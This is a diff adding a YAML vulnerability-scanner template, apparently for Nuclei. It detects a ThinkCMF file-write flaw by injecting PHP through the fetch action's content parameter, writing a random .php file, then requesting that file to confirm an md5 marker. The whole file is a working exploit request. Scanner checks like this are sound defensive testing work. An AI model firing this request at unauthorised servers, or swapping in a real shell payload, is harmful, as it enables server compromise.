@@ -1,0 +1,35 @@
+id: thinkcmf-write-shell
+info:
+  name: Thinkcmf Write Shell
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: write-shell,file-write
+  description: |
+    This template exploits a file write vulnerability in Thinkcmf to write a PHP shell.
+variables:
+  r: "{{rand_int(10000, 20000)}}"
+  r1: "{{md5(r)}}"
+http:
+  - raw:
+      - |
+        GET /index.php?a=fetch&content=%3C?php+file_put_contents(%22{{r}}.php%22,%22%3C?php+echo+md5({{r}})%3B%22)%3B HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: status
+        status:
+          - 200
+  - raw:
+      - |
+        GET /{{r}}.php HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{r1}}"
